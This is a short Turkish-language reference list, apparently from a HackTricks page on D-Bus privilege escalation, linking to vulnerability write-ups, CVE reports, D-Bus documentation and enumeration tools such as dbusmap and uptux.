- [1] [Ubuntu Desktop’ta USBCreator D-Bus ayrıcalık yükseltmesi](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus servisi, ayrıcalığı olmayan herhangi bir kullanıcının yapılandırma yapmasına izin veriyor](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Deepin D-Bus Proxy Service’te kimlik doğrulama atlatma (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "D-Bus için Nmap"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus belgeleri](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
